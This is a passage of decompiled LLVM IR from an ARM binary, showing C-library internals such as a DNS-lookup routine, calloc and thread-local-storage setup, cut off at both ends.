  br i1 %v9_14498, label %dec_label_pc_144d0, label %dec_label_pc_144a0

dec_label_pc_144a0:                               ; preds = %dec_label_pc_14458
  store i32 %v1_14460, i32* @ip, align 4
  %v0_144a8 = load i32, i32* @r7, align 4
  store i32 %v0_144a8, i32* %v2_1437c, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_144b0 = load i32, i32* @r7, align 4
  %v2_144b0 = add i32 %v1_144b0, 8
  %v3_144b0 = inttoptr i32 %v2_144b0 to i32*
  store i32 10, i32* %v3_144b0, align 4
  %v0_144b4 = load i32, i32* @r4, align 4
  store i32 %v0_144b4, i32* %r0.global-to-local, align 4
  %v0_144b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_144b8 = add i32 %v0_144b8, 6
  store i32 %v1_144b8, i32* %r3.global-to-local, align 4
  %v1_144bc = load i32, i32* @r7, align 4
  %v2_144bc = add i32 %v1_144bc, 12
  %v3_144bc = inttoptr i32 %v2_144bc to i32*
  store i32 %v1_144b8, i32* %v3_144bc, align 4
  %v0_144c0 = load i32, i32* @r5, align 4
  %v1_144c0 = load i32, i32* @r7, align 4
  %v2_144c0 = inttoptr i32 %v1_144c0 to i32*
  store i32 %v0_144c0, i32* %v2_144c0, align 4
  %v0_144c4 = load i32, i32* @ip, align 4
  %v1_144c4 = load i32, i32* @r7, align 4
  %v2_144c4 = add i32 %v1_144c4, 16
  %v3_144c4 = inttoptr i32 %v2_144c4 to i32*
  store i32 %v0_144c4, i32* %v3_144c4, align 4
  %v0_144c8 = load i32, i32* @r4, align 4
  %v1_144c8 = load i32, i32* @fp, align 4
  %v2_144c8 = inttoptr i32 %v1_144c8 to i32*
  store i32 %v0_144c8, i32* %v2_144c8, align 4
  br label %dec_label_pc_145e4

dec_label_pc_144d0:                               ; preds = %dec_label_pc_14458
  %v0_144d0 = load i32, i32* @r6, align 4
  %v2_144d0 = icmp eq i32 %v0_144d0, 0
  br i1 %v2_144d0, label %dec_label_pc_144d8, label %dec_label_pc_145d0

dec_label_pc_144d8:                               ; preds = %dec_label_pc_144d0
  %v2_144d8 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_144d8, i32* @r4, align 4
  store i32 %v2_144d8, i32* %r0.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v3_144e8 = bitcast i32* %stack_var_-84 to i8*
  %v4_144e8 = call i32 @__GI_memset(i8* %v3_144e8, i32 0, i32 40)
  store i32 %v4_144e8, i32* %r0.global-to-local, align 4
  %v2_144f0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_144f0, i32* @sb, align 4
  %v7_14530 = icmp eq i32 %tmp7, 5
  br label %dec_label_pc_144f4

dec_label_pc_144f4:                               ; preds = %dec_label_pc_14548, %dec_label_pc_144d8
  store i32 %v2_144f0, i32* %r2.global-to-local, align 4
  store i32 %v2_144d8, i32* %r3.global-to-local, align 4
  %v0_14500 = load i32, i32* @r5, align 4
  store i32 %v0_14500, i32* %r0.global-to-local, align 4
  %v4_14504 = inttoptr i32 %v0_14500 to i8*
  %v5_14504 = call i32 @__dns_lookup(i8* %v4_14504, i32 28, i32 %v2_144f0, i32 %v2_144d8)
  store i32 %v5_14504, i32* @r4, align 4
  %v1_14508 = icmp slt i32 %v5_14504, 0
  %v0_1450c = load i32, i32* @sl, align 4
  store i32 %v0_1450c, i32* %r2.global-to-local, align 4
  %v0_14510 = load i32, i32* @r6, align 4
  %v1_14510 = add i32 %v0_14510, 1
  store i32 %v1_14510, i32* @r6, align 4
  %v0_14514 = load i32, i32* @r5, align 4
  store i32 %v0_14514, i32* %r0.global-to-local, align 4
  br i1 %v1_14508, label %dec_label_pc_145d0, label %dec_label_pc_1451c

dec_label_pc_1451c:                               ; preds = %dec_label_pc_144f4
  %v3_1451c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1451c, i32* @r1, align 4
  %v3_14520 = call i32 @strncpy(i32 %v0_14514, i32 %v3_1451c, i32 %v0_1450c)
  %v3_14524 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_14524, i32* @r0, align 4
  %v0_14528 = call i32 @free()
  store i32 %v0_14528, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* @r1, align 4
  %v0_14534 = load i32, i32* @r4, align 4
  store i32 %v0_14534, i32* %r2.global-to-local, align 4
  %v0_14538 = load i32, i32* @r5, align 4
  store i32 %v0_14538, i32* @r3, align 4
  br i1 %v7_14530, label %dec_label_pc_14540, label %dec_label_pc_14578

dec_label_pc_14540:                               ; preds = %dec_label_pc_1451c
  %v0_14540 = load i32, i32* @r6, align 4
  %v8_14544 = icmp sgt i32 %v0_14540, 5
  br i1 %v8_14544, label %dec_label_pc_1456c, label %dec_label_pc_14548

dec_label_pc_14548:                               ; preds = %dec_label_pc_14540
  store i32 %tmp6, i32* @r1, align 4
  %v3_1454c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1454c, i32* %r0.global-to-local, align 4
  %v0_14550 = load i32, i32* @sl, align 4
  %v5_14554 = call i32 @__decode_dotted(i32 %v3_1454c, i32 %tmp6, i32 %v0_14534, i32 %v0_14538, i32 %v0_14550)
  store i32 %v5_14554, i32* @r4, align 4
  %v3_1455c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1455c, i32* @r0, align 4
  %v0_14560 = call i32 @free()
  store i32 %v0_14560, i32* %r0.global-to-local, align 4
  %v0_14564 = load i32, i32* @r4, align 4
  %v1_14564 = icmp slt i32 %v0_14564, 0
  br i1 %v1_14564, label %dec_label_pc_1456c, label %dec_label_pc_144f4

dec_label_pc_1456c:                               ; preds = %dec_label_pc_14548, %dec_label_pc_14540
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_145d8

dec_label_pc_14578:                               ; preds = %dec_label_pc_1451c
  %v7_14578 = icmp eq i32 %tmp7, 28
  br i1 %v7_14578, label %dec_label_pc_14580, label %dec_label_pc_145c8

dec_label_pc_14580:                               ; preds = %dec_label_pc_14578
  store i32 16, i32* @r2, align 4
  %v0_14588 = load i32, i32* @r8, align 4
  store i32 %v0_14588, i32* @r0, align 4
  %v0_1458c = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_14460, i32* @lr, align 4
  %v1_14598 = load i32, i32* @r7, align 4
  %v2_14598 = add i32 %v1_14598, 8
  %v3_14598 = inttoptr i32 %v2_14598 to i32*
  store i32 10, i32* %v3_14598, align 4
  %v0_1459c = load i32, i32* %r3.global-to-local, align 4
  %v1_1459c = add i32 %v0_1459c, 6
  store i32 %v1_1459c, i32* %r3.global-to-local, align 4
  %v1_145a0 = load i32, i32* @r7, align 4
  %v2_145a0 = add i32 %v1_145a0, 12
  %v3_145a0 = inttoptr i32 %v2_145a0 to i32*
  store i32 %v1_1459c, i32* %v3_145a0, align 4
  %v3_145a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_145a4, i32* @r0, align 4
  %v0_145a8 = load i32, i32* @r5, align 4
  %v1_145a8 = load i32, i32* @r7, align 4
  %v2_145a8 = inttoptr i32 %v1_145a8 to i32*
  store i32 %v0_145a8, i32* %v2_145a8, align 4
  %v0_145ac = load i32, i32* @lr, align 4
  %v1_145ac = load i32, i32* @r7, align 4
  %v2_145ac = add i32 %v1_145ac, 16
  %v3_145ac = inttoptr i32 %v2_145ac to i32*
  store i32 %v0_145ac, i32* %v3_145ac, align 4
  %v0_145b0 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_145c0 = load i32, i32* @r7, align 4
  store i32 %v0_145c0, i32* %v2_1437c, align 4
  %v0_145d8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_145d8

dec_label_pc_145c8:                               ; preds = %dec_label_pc_14578
  %v3_145c8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_145c8, i32* @r0, align 4
  %v0_145cc = call i32 @free()
  store i32 %v0_145cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_145d0

dec_label_pc_145d0:                               ; preds = %dec_label_pc_144f4, %dec_label_pc_144d0, %dec_label_pc_145c8
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_145d8

dec_label_pc_145d8:                               ; preds = %dec_label_pc_14580, %dec_label_pc_1456c, %dec_label_pc_145d0
  %v0_145d8 = phi i32 [ %v0_145d8.pre, %dec_label_pc_14580 ], [ 3, %dec_label_pc_1456c ], [ 1, %dec_label_pc_145d0 ]
  %v1_145d8 = load i32, i32* @fp, align 4
  %v2_145d8 = inttoptr i32 %v1_145d8 to i32*
  store i32 %v0_145d8, i32* %v2_145d8, align 4
  br label %dec_label_pc_145e4

dec_label_pc_145e0:                               ; preds = %dec_label_pc_14370, %dec_label_pc_14384
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_145e4

dec_label_pc_145e4:                               ; preds = %.thread1, %bb27, %dec_label_pc_14408, %dec_label_pc_143ec, %dec_label_pc_145d8, %dec_label_pc_144a0, %dec_label_pc_14350, %dec_label_pc_145e0
  store i32 %v6_14330, i32* @r5, align 4
  store i32 %v9_14330, i32* @r6, align 4
  store i32 %v12_14330, i32* @r7, align 4
  store i32 %v15_14330, i32* @r8, align 4
  store i32 %v18_14330, i32* @sb, align 4
  store i32 %v21_14330, i32* @sl, align 4
  store i32 %v24_14330, i32* @fp, align 4
  %v1_145ec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_145ec

; uselistorder directives
  uselistorder i32 %v2_144d8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14460, { 2, 1, 0, 3 }
  uselistorder i32 %v1_14428, { 1, 0 }
  uselistorder i32 %v0_14394, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp12, { 3, 2, 0, 1 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 14, 13, 15, 16, 18, 17, 20, 19, 21, 23 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0, 3, 2 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder label %dec_label_pc_145e4, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_145e0, { 1, 0 }
  uselistorder label %dec_label_pc_145d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_145d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14420, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_14604 = load i32, i32* @r4, align 4
  %v6_14604 = load i32, i32* @r5, align 4
  %v9_14604 = load i32, i32* @r6, align 4
  %v12_14604 = load i32, i32* @lr, align 4
  %v2_1460c = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_1461c = mul i32 %arg2, %arg1
  store i32 %v2_1461c, i32* @r6, align 4
  br i1 %v2_1460c, label %dec_label_pc_14654, label %dec_label_pc_14624

dec_label_pc_14624:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_1462c = udiv i32 %v2_1461c, %arg1
  %v9_14630 = icmp eq i32 %v2_1462c, %arg2
  br i1 %v9_14630, label %dec_label_pc_14654, label %dec_label_pc_14638

dec_label_pc_14638:                               ; preds = %dec_label_pc_14624
  %v0_1463c = call i32 @__aeabi_read_tp()
  %v3_14640 = load i16, i16* @global_var_23164.175, align 2
  %v4_14640 = sext i16 %v3_14640 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1464c = add i32 %v4_14640, %v0_1463c
  %v4_1464c = inttoptr i32 %v3_1464c to i32*
  store i32 12, i32* %v4_1464c, align 4
  br label %dec_label_pc_14718

dec_label_pc_14654:                               ; preds = %dec_label_pc_14624, %entry
  %v4_14658 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 116) to i32*), align 4
  store i32 %v4_14658, i32* @r4, align 4
  %v4_14670 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 120) to i32*), align 4
  store i32 %v4_14670, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14670)
  %v0_14684 = load i32, i32* @r5, align 4
  %v2_14684 = add i32 %v0_14684, 16
  %v3_14684 = inttoptr i32 %v2_14684 to i32*
  %v4_14684 = load i32, i32* %v3_14684, align 4
  store i32 %v4_14684, i32* %ip.global-to-local, align 4
  store i32 83600, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14684)
  %v0_14690 = load i32, i32* @r6, align 4
  %v1_14694 = call i32 @malloc(i32 %v0_14690)
  store i32 %v1_14694, i32* %r4.global-to-local, align 4
  %v2_14698 = icmp eq i32 %v1_14694, 0
  br i1 %v2_14698, label %.thread, label %dec_label_pc_146a0

dec_label_pc_146a0:                               ; preds = %dec_label_pc_14654
  %v1_146a0 = add i32 %v1_14694, -4
  %v2_146a0 = inttoptr i32 %v1_146a0 to i32*
  %v3_146a0 = load i32, i32* %v2_146a0, align 4
  %v1_146a4 = and i32 %v3_146a0, 2
  %v2_146a4 = icmp eq i32 %v1_146a4, 0
  br i1 %v2_146a4, label %dec_label_pc_146ac, label %.thread

dec_label_pc_146ac:                               ; preds = %dec_label_pc_146a0
  %v1_146ac6 = add i32 %v3_146a0, -4
  %v1_146b0 = and i32 %v1_146ac6, -4
  %v3_146b4 = udiv i32 %v1_146b0, 4
  store i32 %v3_146b4, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_146b0, 36
  %v2_146bc = icmp ult i32 %v1_146b0, 33
  %v3_146bc = or i1 %tmp, %v2_146bc
  br i1 %v3_146bc, label %dec_label_pc_146c8, label %dec_label_pc_146c0

dec_label_pc_146c0:                               ; preds = %dec_label_pc_146ac
  %v3_146c0 = inttoptr i32 %v1_14694 to i8*
  %v4_146c0 = call i32 @__GI_memset(i8* %v3_146c0, i32 0, i32 %v1_146b0)
  br label %.thread

dec_label_pc_146c8:                               ; preds = %dec_label_pc_146ac
  %tmp7 = icmp eq i32 %v1_146b0, 16
  %v2_146cc = inttoptr i32 %v1_14694 to i32*
  store i32 0, i32* %v2_146cc, align 4
  %v1_146d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_146d0 = add i32 %v1_146d0, 4
  %v3_146d0 = inttoptr i32 %v2_146d0 to i32*
  store i32 0, i32* %v3_146d0, align 4
  %v1_146d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_146d4 = add i32 %v1_146d4, 8
  %v3_146d4 = inttoptr i32 %v2_146d4 to i32*
  store i32 0, i32* %v3_146d4, align 4
  %v2_146d8 = icmp ult i32 %v1_146b0, 13
  %v3_146d8 = or i1 %tmp7, %v2_146d8
  br i1 %v3_146d8, label %.thread, label %dec_label_pc_146dc

dec_label_pc_146dc:                               ; preds = %dec_label_pc_146c8
  %v0_146dc = load i32, i32* %ip.global-to-local, align 4
  %v1_146e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_146e0 = add i32 %v1_146e0, 12
  %v3_146e0 = inttoptr i32 %v2_146e0 to i32*
  store i32 0, i32* %v3_146e0, align 4
  %v1_146e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_146e4 = add i32 %v1_146e4, 16
  %v3_146e4 = inttoptr i32 %v2_146e4 to i32*
  store i32 0, i32* %v3_146e4, align 4
  %tmp8 = icmp ult i32 %v0_146dc, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_146ec

dec_label_pc_146ec:                               ; preds = %dec_label_pc_146dc
  %v0_146ec = load i32, i32* %ip.global-to-local, align 4
  %v7_146ec = icmp eq i32 %v0_146ec, 9
  %v1_146f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_146f0 = add i32 %v1_146f0, 20
  %v3_146f0 = inttoptr i32 %v2_146f0 to i32*
  store i32 0, i32* %v3_146f0, align 4
  %v1_146f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_146f4 = add i32 %v1_146f4, 24
  %v3_146f4 = inttoptr i32 %v2_146f4 to i32*
  store i32 0, i32* %v3_146f4, align 4
  br i1 %v7_146ec, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_146ec
  %v2_146f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_146f8 = add i32 %v2_146f8, 32
  %v4_146f8 = inttoptr i32 %v3_146f8 to i32*
  store i32 0, i32* %v4_146f8, align 4
  %v2_146fc = load i32, i32* %r4.global-to-local, align 4
  %v3_146fc = add i32 %v2_146fc, 28
  %v4_146fc = inttoptr i32 %v3_146fc to i32*
  store i32 0, i32* %v4_146fc, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_146ec, %dec_label_pc_146a0, %dec_label_pc_146dc, %dec_label_pc_146c8, %dec_label_pc_14654, %dec_label_pc_146c0, %bb
  store i32 1, i32* @r1, align 4
  %v0_1470c = load i32, i32* @r5, align 4
  %v2_1470c = add i32 %v0_1470c, 48
  %v3_1470c = inttoptr i32 %v2_1470c to i32*
  %v4_1470c = load i32, i32* %v3_1470c, align 4
  store i32 %v4_1470c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1470c)
  br label %dec_label_pc_14718

dec_label_pc_14718:                               ; preds = %dec_label_pc_14638, %.thread
  %v0_14718 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_14604, i32* @r4, align 4
  store i32 %v6_14604, i32* @r5, align 4
  store i32 %v9_14604, i32* @r6, align 4
  store i32 %v12_14604, i32* @lr, align 4
  ret i32 %v0_14718

; uselistorder directives
  uselistorder i32 %v1_146b0, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v1_14694, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_14718, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_14730(i32 %arg1) local_unnamed_addr {
dec_label_pc_14730:
  %v0_14730 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14730, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_14730
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14730, %bb
  %v10_14740 = phi i32 [ %arg1, %dec_label_pc_14730 ], [ 0, %bb ]
  ret i32 %v10_14740

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v3_14750 = load i32, i32* @r4, align 4
  store i32 %v3_14750, i32* %stack_var_-16, align 4
  %v4_14754 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 80) to i32*), align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1475c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 64) to i32*), align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v4_14764 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 40) to i32*), align 4
  store i32 %v4_14764, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v1_1476c = inttoptr i32 %v4_14754 to i32*
  %v2_1476c = load i32, i32* %v1_1476c, align 4
  %v4_14770 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 56) to i32*), align 4
  store i32 %v4_14770, i32* %lr.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v1_14778 = add i32 %v2_1476c, 15
  %v4_1477c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 152) to i32*), align 4
  store i32 %v4_1477c, i32* @ip, align 4
  %v1_14780 = load i32, i32* @r0, align 4
  %v2_14780 = add i32 %v1_14780, %v1_14778
  %v1_14784 = inttoptr i32 %v4_1475c to i32*
  %v2_14784 = load i32, i32* %v1_14784, align 4
  store i32 %v2_14784, i32* %r3.global-to-local, align 4
  %v1_14788 = and i32 %v2_14780, -16
  store i32 %v1_14788, i32* %v1_1476c, align 4
  %v0_14790 = load i32, i32* @r0, align 4
  %v1_14790 = load i32, i32* %r4.global-to-local, align 4
  %v2_14790 = inttoptr i32 %v1_14790 to i32*
  store i32 %v0_14790, i32* %v2_14790, align 4
  %v0_14794 = load i32, i32* @r1, align 4
  %v1_14794 = load i32, i32* %lr.global-to-local, align 4
  %v2_14794 = inttoptr i32 %v1_14794 to i32*
  store i32 %v0_14794, i32* %v2_14794, align 4
  %v0_14798 = load i32, i32* %r3.global-to-local, align 4
  %v1_14798 = load i32, i32* @ip, align 4
  %v2_14798 = inttoptr i32 %v1_14798 to i32*
  store i32 %v0_14798, i32* %v2_14798, align 4
  %v2_1479c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1479c, i32* %r4.global-to-local, align 4
  %v1_147a0 = load i32, i32* @r0, align 4
  ret i32 %v1_147a0

; uselistorder directives
  uselistorder i32 152, { 0, 2, 1, 3 }
}

define i32 @function_147a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_147a8:
  %v0_147a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_147a8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_147a8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_147a8, %bb
  %v4_147b8 = phi i32 [ %arg1, %dec_label_pc_147a8 ], [ 0, %bb ]
  ret i32 %v4_147b8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r3.global-to-local, align 4
  %v4_147cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 92) to i32*), align 4
  store i32 %v4_147cc, i32* @lr, align 4
  %v4_147d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 64) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 12488) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 12488), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_147f8 = inttoptr i32 %v4_147d8 to i32*
  store i32 1, i32* %v2_147f8, align 4
  %v0_147fc = load i32, i32* %r3.global-to-local, align 4
  %v1_147fc = load i32, i32* @lr, align 4
  %v2_147fc = inttoptr i32 %v1_147fc to i32*
  store i32 %v0_147fc, i32* %v2_147fc, align 4
  %v0_14800 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_14818(i32 %arg1) local_unnamed_addr {
dec_label_pc_14818:
  %v0_14818 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14818, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14818
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14818, %bb
  %v7_14820 = phi i32 [ %arg1, %dec_label_pc_14818 ], [ 0, %bb ]
  ret i32 %v7_14820

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1482c = call i32 @__aeabi_read_tp()
  %v1_14830 = inttoptr i32 %v0_1482c to i32*
  %v2_14830 = load i32, i32* %v1_14830, align 4
  %v1_14834 = add i32 %arg1, 4
  %v2_14834 = inttoptr i32 %v1_14834 to i32*
  %v3_14834 = load i32, i32* %v2_14834, align 4
  %v1_14838 = add i32 %v2_14830, 8
  %v2_14838 = inttoptr i32 %v1_14838 to i32*
  %v3_14838 = load i32, i32* %v2_14838, align 4
  %v2_1483c = add i32 %v3_14838, %v3_14834
  ret i32 %v2_1483c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14848 = load i32, i32* @r4, align 4
  store i32 %v3_14848, i32* %stack_var_-36, align 4
  %v6_14848 = load i32, i32* @r5, align 4
  %v15_14848 = load i32, i32* @r8, align 4
  %v18_14848 = load i32, i32* @sb, align 4
  %v21_14848 = load i32, i32* @sl, align 4
  %v24_14848 = load i32, i32* @fp, align 4
  %v27_14848 = load i32, i32* @lr, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %sl.global-to-local, align 4
  %v4_14858 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 112) to i32*), align 4
  store i32 %v4_14858, i32* %r3.global-to-local, align 4
  %v1_1485c = inttoptr i32 %v4_14858 to i32*
  %v2_1485c = load i32, i32* %v1_1485c, align 4
  store i32 %v2_1485c, i32* %r2.global-to-local, align 4
  %v2_14860 = icmp eq i32 %v2_1485c, 0
  %v0_14868 = load i32, i32* %r0.global-to-local, align 4
  %v0_1486c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1486c, i32* %ip.global-to-local, align 4
  br i1 %v2_14860, label %dec_label_pc_14a34, label %dec_label_pc_14874

dec_label_pc_14874:                               ; preds = %entry
  store i32 164, i32* %r3.global-to-local, align 4
  %v4_14878 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 164) to i32*), align 4
  store i32 %v4_14878, i32* @lr, align 4
  store i32 %v2_1485c, i32* %r1.global-to-local, align 4
  %v1_148c0 = inttoptr i32 %v4_14878 to i32*
  %v2_148c061 = load i32, i32* %v1_148c0, align 4
  %v4_148c462 = mul i32 %v2_148c061, 32
  %v5_148c463 = add i32 %v4_148c462, %v2_1485c
  store i32 %v5_148c463, i32* %r3.global-to-local, align 4
  %v3_148c865 = icmp ult i32 %v2_1485c, %v5_148c463
  br i1 %v3_148c865, label %dec_label_pc_14884, label %dec_label_pc_14a34.loopexit

dec_label_pc_14884:                               ; preds = %dec_label_pc_14874, %dec_label_pc_148bc
  %v0_1489c66 = phi i32 [ %v1_148bc, %dec_label_pc_148bc ], [ %v2_1485c, %dec_label_pc_14874 ]
  %v1_14884 = inttoptr i32 %v0_1489c66 to i32*
  %v2_14884 = load i32, i32* %v1_14884, align 4
  store i32 %v2_14884, i32* %r3.global-to-local, align 4
  %v7_14888 = icmp eq i32 %v2_14884, 7
  br i1 %v7_14888, label %dec_label_pc_14890, label %dec_label_pc_148bc

dec_label_pc_14890:                               ; preds = %dec_label_pc_14884
  %v1_14890 = add i32 %v0_1489c66, 20
  %v2_14890 = inttoptr i32 %v1_14890 to i32*
  %v3_14890 = load i32, i32* %v2_14890, align 4
  store i32 %v3_14890, i32* %r3.global-to-local, align 4
  %v1_14894 = add i32 %v0_1489c66, 28
  %v2_14894 = inttoptr i32 %v1_14894 to i32*
  %v3_14894 = load i32, i32* %v2_14894, align 4
  store i32 %v3_14894, i32* @r6, align 4
  %v1_1489c = add i32 %v0_1489c66, 16
  %v2_1489c = inttoptr i32 %v1_1489c to i32*
  %v3_1489c = load i32, i32* %v2_1489c, align 4
  store i32 %v3_1489c, i32* %r3.global-to-local, align 4
  %v1_148a0 = add i32 %v0_1489c66, 8
  %v2_148a0 = inttoptr i32 %v1_148a0 to i32*
  %v3_148a0 = load i32, i32* %v2_148a0, align 4
  store i32 %v3_148a0, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_14894, %v0_1486c
  %v0_1486c.v3_14894 = select i1 %tmp78, i32 %v0_1486c, i32 %v3_14894
  store i32 %v0_1486c.v3_14894, i32* %fp.global-to-local, align 4
  %v2_148d8 = icmp eq i32 %v3_14894, 0
  br i1 %v2_148d8, label %dec_label_pc_14900, label %bb

dec_label_pc_148bc:                               ; preds = %dec_label_pc_14884
  %v1_148bc = add i32 %v0_1489c66, 32
  store i32 %v1_148bc, i32* %r1.global-to-local, align 4
  %v2_148c0 = load i32, i32* %v1_148c0, align 4
  %v4_148c4 = mul i32 %v2_148c0, 32
  %v5_148c4 = add i32 %v4_148c4, %v2_1485c
  store i32 %v5_148c4, i32* %r3.global-to-local, align 4
  %v3_148c8 = icmp ult i32 %v1_148bc, %v5_148c4
  br i1 %v3_148c8, label %dec_label_pc_14884, label %dec_label_pc_148c0.dec_label_pc_14a34.loopexit_crit_edge

